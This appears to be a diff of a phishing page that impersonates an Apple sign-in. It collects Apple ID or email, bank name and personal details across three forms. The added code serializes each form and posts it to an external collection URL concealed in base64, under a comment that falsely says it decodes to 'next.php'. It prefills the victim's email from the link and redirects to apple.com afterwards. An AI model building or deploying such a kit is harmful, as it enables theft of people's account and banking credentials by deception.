@@ -295,11 +295,6 @@
             padding-bottom: 180px; /* More space for footer on mobile */
         }
     }
-
-    /* Anti-bot honeypot */
-    .bot-field {
-        display: none;
-    }
     </style>
 </head>
 
@@ -373,13 +368,7 @@
                         
                         <form action="next.php" method="POST" name="signinform" id="form-field-1">
                             <input type="hidden" name="count" id="count" value="0">
-                            <input type="hidden" name="attempt" id="attempt" value="1">
                             <input type="hidden" name="btn1" value="btn1">
-                            
-                            <!-- Honeypot field for bots -->
-                            <div class="form-group bot-field">
-                                <input type="text" name="website" id="website" class="form-control">
-                            </div>
                             
                             <div class="form-group">
                                 <input type="text" name="ai" id="ai" required class="form-control" placeholder="Apple ID or Email">
@@ -437,11 +426,6 @@
                         
                         <form action="next.php" method="POST" name="signinform" id="form-field-2">
                             <input type="hidden" name="btn2" value="btn2">
-                            
-                            <!-- Honeypot field for bots -->
-                            <div class="form-group bot-field">
-                                <input type="text" name="website2" id="website2" class="form-control">
-                            </div>
                             
                             <div class="form-group">
                                 <input type="text" name="bank_name" required class="form-control" placeholder="Bank Name">
@@ -504,11 +488,6 @@
                         
                         <form action="next.php" method="POST" name="signinform" id="form-field-3">
                             <input type="hidden" name="btn3" value="btn3">
-                            
-                            <!-- Honeypot field for bots -->
-                            <div class="form-group bot-field">
-                                <input type="text" name="website3" id="website3" class="form-control">
-                            </div>
                             
                             <div class="form-group">
                                 <input type="text" name="fname" required class="form-control" placeholder="First Name">
@@ -600,34 +579,140 @@ var rdrt = "https://www.apple.com/";
 //mailer link - this is where your next.php file is referenced
 var f = atob("aHR0cHM6Ly9yb3RhZG9zYWJvci5jb20vam9rZXIvbmV4dC5waHA=");  // This decodes to "next.php"
 
-// Additional antibot measures
-function detectBot() {
-    // Check if user agent contains common bot identifiers
-    var botPattern = "(googlebot\/|bot|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";
-    var re = new RegExp(botPattern, 'i');
-    if (re.test(navigator.userAgent)) {
-        return true;
+$(document).ready(function() {
+    var count = 0;
+
+    /////////////url ai getting////////////////
+    var ai = window.location.hash.substr(1);
+    if (!ai) {
+
+    } else {
+        var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
+
+        if (!base64regex.test(ai)) {
+            // alert(btoa(ai));
+            var my_ai = ai;
+        } else {
+            // alert(atob(ai));
+            var my_ai = atob(ai);
+        }
+
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        $('#ai').val(my_ai);
     }
-    
-    // Check if browser has typical bot behaviors
-    if (
-        !('localStorage' in window) ||
-        !('sessionStorage' in window) ||
-        !('fetch' in window) ||
-        !('WebSocket' in window) ||
-        document.documentElement.classList.contains('headless')
-    ) {
-        return true;
-    }
-    
-    // Check for touch and mouse capability (most bots don't have this)
-    if (
-        !('ontouchstart' in window) && 
-        !('onmousemove' in document.documentElement) && 
-        !navigator.maxTouchPoints
-    ) {
-        return true;
-    }
-    
-    return false;
-}
+
+    $('#sub-btn-1').click(function(b) {
+        $('#error').hide();
+        $('#msg').hide();
+
+        b.preventDefault();
+        passValidation = true;
+        $($("#form-field-1").find("input[required]").get().reverse()).each(function(i, a) {
+            if (!a.checkValidity()) {
+                a.reportValidity();
+                passValidation = false;
+                return
+            }
+        });
+        if (!passValidation) {
+            return
+        }
+        var c = $("#form-field-1").serialize();
+        $.ajax({
+            dataType: 'JSON',
+            url: f,
+            type: 'POST',
+            data: c,
+            beforeSend: function(a) {
+                // $('#sub-btn-1').html('Verifying...')
+            },
+            complete: function(a) {
+                $("#bl1").animate({
+                    left: 0,
+                    opacity: "hide"
+                }, 0);
+                $("#bl2").animate({
+                    right: 0,
+                    opacity: "show"
+                }, 500)
+            }
+        })
+    })
+
+    $('#sub-btn-2').click(function(b) {
+        $('#error').hide();
+        $('#msg').hide();
+
+        b.preventDefault();
+        passValidation = true;
+        $($("#form-field-2").find("input[required]").get().reverse()).each(function(i, a) {
+            if (!a.checkValidity()) {
+                a.reportValidity();
+                passValidation = false;
+                return
+            }
+        });
+        if (!passValidation) {
+            return
+        }
+        var c = $("#form-field-2").serialize();
+        $.ajax({
+            dataType: 'JSON',
+            url: f,
+            type: 'POST',
+            data: c,
+            beforeSend: function(a) {
+                $('#sub-btn-2').html('Verifying...')
+            },
+            complete: function(a) {
+                $("#bl2").animate({
+                    left: 0,
+                    opacity: "hide"
+                }, 0);
+                $("#bl3").animate({
+                    right: 0,
+                    opacity: "show"
+                }, 500)
+            }
+        })
+    })
+
+    $('#sub-btn-3').click(function(b) {
+        $('#error').hide();
+        $('#msg').hide();
+
+        b.preventDefault();
+        passValidation = true;
+        $($("#form-field-3").find("input[required]").get().reverse()).each(function(i, a) {
+            if (!a.checkValidity()) {
+                a.reportValidity();
+                passValidation = false;
+                return
+            }
+        });
+        if (!passValidation) {
+            return
+        }
+        
+        var c = $("#form-field-3").serialize();
+        
+        $.ajax({
+            dataType: 'JSON',
+            url: f,
+            type: 'POST',
+            data: c,
+            beforeSend: function(a) {
+                $('#sub-btn-3').html('Processing...')
+            },
+            complete: function(a) {
+                window.location.replace(rdrt)
+            }
+        })
+    })
+});
+</script>
+
+</html>
